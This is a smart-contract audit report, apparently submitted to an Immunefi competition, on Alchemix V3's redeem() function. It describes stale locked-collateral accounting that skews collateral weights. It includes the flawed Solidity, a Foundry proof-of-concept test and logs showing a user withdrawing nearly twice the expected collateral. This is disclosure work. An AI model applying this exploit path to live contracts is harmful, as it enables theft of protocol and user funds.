# 58396 sc high total locked is not cleared proportionally to the total debt this forces the collateral weight to become incorrect and new users transmuter redeem repayment will repay more debt fo&#x20;

**Submitted on Nov 1st 2025 at 22:58:06 UTC by @Outliers for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #58396
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

redeem() reduces totalDebt and cumulativeEarmarked correctly, but updates \_totalLocked using totalOut (the collateral moved out) instead of reducing \_totalLocked proportionally to the debt that was cleared. When the transmuter covers some debt or fees/rounding apply, \_totalLocked can remain > 0 even though the corresponding earmarked debt is cleared — leaving stale locked collateral that skews future collateral weight calculations and causes new users to pay less debt than they should.

## Vulnerability Details

The system compute survival (i.e. remaining earmarks) based on redeemedDebtTotal / liveEarmarked, and use that to update \_survivalAccumulator/weights — but then you reduce \_totalLocked by totalOut (an absolute collateral value), which is unrelated to the same debt-proportion factor when cover/fees/rounding differ. The correct semantic is: \_totalLocked should be reduced in the same proportion as cumulativeEarmarked/totalDebt was reduced (i.e. scale by (liveEarmarked - redeemedDebtTotal)/liveEarmarked). Collateral-weight bookkeeping must use the actual locked collateral removed (old - new) as the weight increment, not totalOut.

```solidity
 /// @inheritdoc IAlchemistV3Actions
    function redeem(uint256 amount) external onlyTransmuter {
        _earmark();


        emit cumulativeguy(cumulativeEarmarked);

        uint256 liveEarmarked = cumulativeEarmarked;
        if (amount > liveEarmarked) amount = liveEarmarked;

        // observed transmuter pre-balance -> potential cover
        uint256 transmuterBal = TokenUtils.safeBalanceOf(myt, address(transmuter));
        uint256 deltaYield    = transmuterBal > lastTransmuterTokenBalance ? transmuterBal - lastTransmuterTokenBalance : 0;
        uint256 coverDebt = convertYieldTokensToDebt(deltaYield);

        // cap cover so we never consume beyond remaining earmarked
        uint256 coverToApplyDebt = amount + coverDebt > liveEarmarked ? (liveEarmarked - amount) : coverDebt;

        uint256 redeemedDebtTotal = amount + coverToApplyDebt;

       // Apply redemption weights/decay to the full amount that left the earmarked bucket
        if (liveEarmarked != 0 && redeemedDebtTotal != 0) {
            uint256 survival = ((liveEarmarked - redeemedDebtTotal) << 128) / liveEarmarked;
            _survivalAccumulator = _mulQ128(_survivalAccumulator, survival);
            _redemptionWeight += PositionDecay.WeightIncrement(redeemedDebtTotal, cumulativeEarmarked);
        }

        // earmarks are reduced by the full redeemed amount (net + cover)
        cumulativeEarmarked -= redeemedDebtTotal;

        // global borrower debt falls by the full redeemed amount
        totalDebt -= redeemedDebtTotal;

        lastRedemptionBlock = block.number;

        // consume the observed cover so it can't be reused
        if (deltaYield != 0) {
            uint256 usedYield = convertDebtTokensToYield(coverToApplyDebt);
            lastTransmuterTokenBalance = transmuterBal > usedYield ? transmuterBal - usedYield : transmuterBal;
        }

        // move only the net collateral + fee
        uint256 collRedeemed  = convertDebtTokensToYield(amount);        // total out is updated 
        uint256 feeCollateral = collRedeemed * protocolFee / BPS;
        uint256 totalOut      = collRedeemed + feeCollateral;

       
      //  uint256 newtotalLocked  = (convertDebtTokensToYield(totalDebt) * minimumCollateralization) / FIXED_POINT_SCALAR;  

      
        // update locked collateral + collateral weight
        uint256 old = _totalLocked;                              

@audit>>>          _totalLocked = totalOut > old ? 0 : old - totalOut; // reduce this with th debt to amount ratio. that is debt in transmuter covered/
 
@audit>>>        _collateralWeight += PositionDecay.WeightIncrement(totalOut > old ? old : totalOut, old);       // test this well

        TokenUtils.safeTransfer(myt, transmuter, collRedeemed);           
        TokenUtils.safeTransfer(myt, protocolFeeReceiver, feeCollateral);    
        _mytSharesDeposited -= collRedeemed + feeCollateral;                 

        emit Redemption(redeemedDebtTotal);
    }
```

The residual total locked is not proportional to the present debt of the system. This will cause the next claim from the transmuter that calls redeems leads to an incorrect weight calculation.

In the sync function.

```solidity

    /// @dev Update the user's earmarked and redeemed debt amounts.
    function _sync(uint256 tokenId) internal {
        Account storage account = _accounts[tokenId];


@audit>>>          uint256 collateralToRemove = PositionDecay.ScaleByWeightDelta(account.rawLocked, _collateralWeight - account.lastCollateralWeight); // rawlocked is subject to change recalculate it and then release.

@audit>>>        account.collateralBalance -= collateralToRemove;                     

```

This breaks the expected proportionality between debt and collateral:

* Example:
  * Before redeem: `totalDebt = 500`, `_totalLocked = 600`
  * After redeem: `totalDebt = 0`, but `_totalLocked ≈ 50` (residual left due to incorrect subtraction)

This residual collateral inflates the global collateral weight denominator, lowering the effective collateral weight for new participants. Consequently, subsequent users repaying with transmuter will pay **more debt** for less collateral, leading to incorrect collateralization and inconsistent system accounting.

***

## Impact Details

1. **Accounting Drift** `_totalLocked` remains higher than intended after redemptions, desynchronizing total collateral from total debt.
2. **Incorrect Collateral Weight** The collateral weight becomes incorrectly stated, allowing new users to redeem their debt, repaying with lesser collateral than expected.

## References

## Proof of Concept

## Proof of Concept

```solidity

function test_balance_of_lock_persistence_after_partial_clear_with_transmuter2() external {
    // ---- Setup: Mint yield tokens to whale ----
    vm.startPrank(someWhale);
    IMockYieldToken(mockStrategyYieldToken).mint(whaleSupply, someWhale);
    vm.stopPrank();

    console.log("\n=== INITIAL STATE ===");
    console.log("Total locked before any operation:", alchemist.totallocked());
    console.log("Transmuter balance before:", alchemist.letsee());

    // ============================================================
    // ---- ROUND 1: Deposit + Mint + Redemption + Partial Withdraw
    // ============================================================

    vm.startPrank(address(0xbeef));
    SafeERC20.safeApprove(address(vault), address(alchemist), depositAmount + 100e18);
    alchemist.deposit(depositAmount / 2, address(0xbeef), 0);

    uint256 tokenId1 = AlchemistNFTHelper.getFirstTokenId(address(0xbeef), address(alchemistNFT));
    uint256 debt1 = alchemist.totalValue(tokenId1) * FIXED_POINT_SCALAR / minimumCollateralization;
    alchemist.mint(tokenId1, debt1, address(0xbeef));
    vm.stopPrank();

    (uint beefLock1,,,,) = alchemist.seelockedindividual(tokenId1);
    console.log("\n=== AFTER FIRST BORROW ===");
    console.log("Total locked:", alchemist.totallocked());
    console.log("collateral balance",alchemist.bal(tokenId1));
    console.log("Locked for 0xBeef (CDP1):", beefLock1);
     console.log("In yield",alchemist.convertDebtTokensToYield(debt1));

     uint difference = alchemist.bal(tokenId1) - alchemist.convertDebtTokensToYield(debt1);
    console.log("Self repaying remaining",difference); 
    console.log("Issued debt (CDP1):", debt1);
    console.log("Total synthetic debt issued:", alchemist.totalSyntheticsIssued());
    console.log("Protocol totalDebt:", alchemist.totalDebt());

    // ---- Simulate Transmuter activity (create redemption) ----
    vm.startPrank(address(anotherExternalUser));
    SafeERC20.safeApprove(address(alToken), address(transmuterLogic), debt1);
    transmuterLogic.createRedemption(debt1);
    vm.stopPrank();

    vm.roll(block.number + 5_256_100);

    console.log("\n=== BEFORE CLAIM REDEMPTION ===");
    console.log("Total debt:", alchemist.totalDebt());
    console.log("Total locked:", alchemist.totallocked());
    console.log("Transmuter balance before claim:", alchemist.letsee());

    // ---- Claim redemption ----
    vm.startPrank(address(anotherExternalUser));
    transmuterLogic.claimRedemption(1);
    vm.stopPrank();

    console.log("\n=== AFTER CLAIM REDEMPTION ===");
    console.log("Transmuter balance after claim:", alchemist.letsee());
    console.log("Total debt after claim:", alchemist.totalDebt());
    console.log("In yield",alchemist.convertDebtTokensToYield(debt1));
    console.log("Total synthetic supply after claim:", alchemist.totalSyntheticsIssued());
    console.log("Locked collateral still in system:", alchemist.totallocked());

    //alchemist.setlockedto0();

     console.log("Locked collateral after reset in system:", alchemist.totallocked());
    // ---- Poke to refresh accounting ----
    alchemist.poke(tokenId1);
    (uint256 col1, uint256 debtAfter1,) = alchemist.getCDP(tokenId1);
    console.log("\n=== CDP STATE POST-TRANSMUTER ===");
    console.log("Collateral before partial withdrawal:", col1);
    console.log("Debt before partial withdrawal:", debtAfter1);

    // ---- Withdraw partially (simulate not clearing all total locked) ----
    vm.startPrank(address(0xbeef));
    alchemist.withdraw(col1 / 2, address(0xbeef), tokenId1);
    vm.stopPrank();

    console.log("\n=== AFTER PARTIAL WITHDRAWAL ===");
    console.log("Remaining collateral (CDP1):", col1 - (col1 / 2));
    console.log("Total locked after partial withdrawal:", alchemist.totallocked());
    console.log("Protocol totalDebt after partial withdrawal:", alchemist.totalDebt());

    // ============================================================
    // ---- ROUND 2: New Deposit + Mint + Redemption
    // ============================================================

    vm.startPrank(address(0xbeef));
    SafeERC20.safeApprove(address(vault), address(alchemist), depositAmount + 100e18);
    alchemist.deposit(depositAmount / 2, address(0xbeef), 0);

    uint256 tokenId2 = AlchemistNFTHelper.getNextTokenId(address(0xbeef), address(alchemistNFT));
    uint256 debt2 = alchemist.totalValue(tokenId2) * FIXED_POINT_SCALAR / minimumCollateralization;
    alchemist.mint(tokenId2, debt2, address(0xbeef));
    vm.stopPrank();

    uint balbefore = alchemist.bal(tokenId2);

    (uint beefLock2,,,,) = alchemist.seelockedindividual(tokenId2);
    console.log("\n=== AFTER SECOND BORROW ===");
    console.log("collateral balance",alchemist.bal(tokenId2));
    console.log("Locked for 0xBeef (CDP2):", beefLock2);
    console.log("Total locked after second borrow:", alchemist.totallocked());
    console.log("Total protocol debt:", alchemist.totalDebt());

    // ---- Transmuter interaction again ----
    vm.startPrank(address(anotherExternalUser));
    SafeERC20.safeApprove(address(alToken), address(transmuterLogic), debt2);
    transmuterLogic.createRedemption(debt2);
    vm.stopPrank();

    vm.roll(block.number + 5_256_100);

    vm.startPrank(address(anotherExternalUser));
    transmuterLogic.claimRedemption(2);
    vm.stopPrank();

    console.log("\n=== AFTER SECOND CLAIM ===");
    console.log("Transmuter balance:", alchemist.letsee());
    console.log("Total locked:", alchemist.totallocked());
    console.log("Total debt:", alchemist.totalDebt());
    console.log("Total synthetics issued:", alchemist.totalSyntheticsIssued());

    // ---- Final poke & accounting check ----
    alchemist.poke(tokenId2);
    (uint256 col2, uint256 debtAfter2,) = alchemist.getCDP(tokenId2);

    console.log("\n=== FINAL STATE ===");
     console.log("In yield",alchemist.convertDebtTokensToYield(debt2));

 uint difference2 = balbefore - alchemist.convertDebtTokensToYield(debt2);
    console.log("Collateral should remain for second borrow action",difference2); 
    console.log("Self repaying remaining balacne for first borrow action",difference);
    console.log("Collateral in CDP2 we have unlocked the same debt for less collateral without price change:", col2);
    console.log("Debt in CDP2:", debtAfter2);
    console.log("Protocol total locked (should include residuals):", alchemist.totallocked());
    console.log("Protocol total debt:", alchemist.totalDebt());



```

```solidity
Ran 1 test for src/test/AlchemistV3.t.sol:AlchemistV3Test
[PASS] test_balance_of_lock_persistence_after_partial_clear_with_transmuter2() (gas: 4927125)
Logs:
  
=== INITIAL STATE ===
  Total locked before any operation: 0
  Transmuter balance before: 0
  
=== AFTER FIRST BORROW ===
  Total locked: 99999999999999999999999
  collateral balance 100000000000000000000000
  Locked for 0xBeef (CDP1): 99999999999999999999999
  In yield 90000000000000000009000
  Self repaying remaining 9999999999999999991000
  Issued debt (CDP1): 90000000000000000009000
  Total synthetic debt issued: 90000000000000000009000
  Protocol totalDebt: 90000000000000000009000
  
=== BEFORE CLAIM REDEMPTION ===
  Total debt: 90000000000000000009000
  Total locked: 99999999999999999999999
  Transmuter balance before claim: 0
  
=== AFTER CLAIM REDEMPTION ===
  Transmuter balance after claim: 0
  Total debt after claim: 0
  In yield 90000000000000000009000
  Total synthetic supply after claim: 0
  Locked collateral still in system: 9099999999999999990909
  Locked collateral after reset in system: 9099999999999999990909
  
=== CDP STATE POST-TRANSMUTER ===
  Collateral before partial withdrawal: 9099999999999999990910
  Debt before partial withdrawal: 0
  
=== AFTER PARTIAL WITHDRAWAL ===
  Remaining collateral (CDP1): 4549999999999999995455
  Total locked after partial withdrawal: 9099999999999999990909
  Protocol totalDebt after partial withdrawal: 0
  
=== AFTER SECOND BORROW ===
  collateral balance 100000000000000000000000
  Locked for 0xBeef (CDP2): 99999999999999999999999
  Total locked after second borrow: 109099999999999999990908
  Total protocol debt: 90000000000000000009000
  
=== AFTER SECOND CLAIM ===
  Transmuter balance: 0
  Total locked: 18199999999999999981818
  Total debt: 0
  Total synthetics issued: 0
  
=== FINAL STATE ===
  In yield 90000000000000000009000
  Collateral should remain for second borrow action 9999999999999999991000
  Self repaying remaining balacne for first borrow action 9999999999999999991000
  Collateral in CDP2 we have unlocked the same debt for less collateral without price change: 16681943171402383119464
  Debt in CDP2: 0
  Protocol total locked (should include residuals): 18199999999999999981818
  Protocol total debt: 0

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 21.64ms (7.63ms CPU time)

```

User makes away with 16681943171402383119464 instead of 9999999999999999991000, almost a 2x loss for the protocol.
